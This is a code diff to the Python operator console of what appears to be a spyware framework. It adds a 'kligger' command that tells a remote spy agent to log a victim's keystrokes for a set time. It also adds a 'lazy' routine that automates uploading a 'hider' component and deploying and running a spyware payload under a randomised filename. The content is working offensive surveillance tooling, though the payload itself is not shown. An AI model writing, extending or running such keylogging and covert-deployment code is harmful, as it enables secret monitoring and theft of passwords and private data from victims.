@@ -3,6 +3,8 @@ from operation import Operation
 from contParams import *
 from funCode import FunCode
 import tabulate
+from icecream import ic
+from random import randint
 
 USAGE_EXAMPLE = """-------Try This-------
 $ ops
@@ -143,7 +145,6 @@ class UI:
         weird_dict = [{'IP': ip, 'Name': op.name, 'Selected': op == self.ctx.selected_operation} for ip, op in self.ctx.oper_dict.items()]
         print(tabulate.tabulate(weird_dict, headers="keys", tablefmt="simple"))
 
-
     def rename(self, old_name, new_name):
         """
         USAGE: rename <old_name> <new_name>
@@ -266,6 +267,33 @@ class UI:
         )
         self.ctx.cont_ident += 1
 
+    def kligger(self, time):
+        """
+        USAGE: kligger <time>
+        Performs keylogging on spyware
+        
+        @pre:
+        hider was setup in spyware
+        
+        Args:
+            time - how many seconds to track
+        """
+        time = int(time)
+        if not self.is_op_active():
+            return
+        self.setup('sentHider.o', 'f', 'f')
+        kligPar = Params()
+        kligPar.kligP = kligPrams(time)
+        ic(kligPar)
+        kligP = ContParams(KligerType, kligPar)
+        ic(kligP)
+        print(
+            self.ctx.selected_operation.spyAgent.runContraption(
+                kligP, self.ctx.cont_ident
+            )
+        )
+        self.ctx.cont_ident += 1
+
     def setup(self, targetPath, imagePath, mountPath):
         """
         USAGE: setup <targetPath> <imagePath> <mountPath>
@@ -351,6 +379,22 @@ class UI:
                 homePath,
                 targetPath,
             ))
+
+    def lazy(self):
+        """
+        Automatic steps up to spyware run
+        """
+        ip = '127.0.0.1'
+        hiderHome = 'hider'
+        hiderTarg = 'sentHider.o'
+        spyHome = 'spyware'
+        spyTarget = "sentSpyware" + str(randint(1, 1000)) + ".spy"
+        self.select(ip)
+        self.manager('write_file', hiderHome, hiderTarg)
+        self.setup(hiderTarg, 'f', 'f')
+        self.uprun(spyHome, spyTarget)
+        self.setup(hiderTarg, 'f', 'f')
+        print('Done. Your turn.')
 
     def list_ops_names(self):
         for op in self.ctx.oper_dict.values():
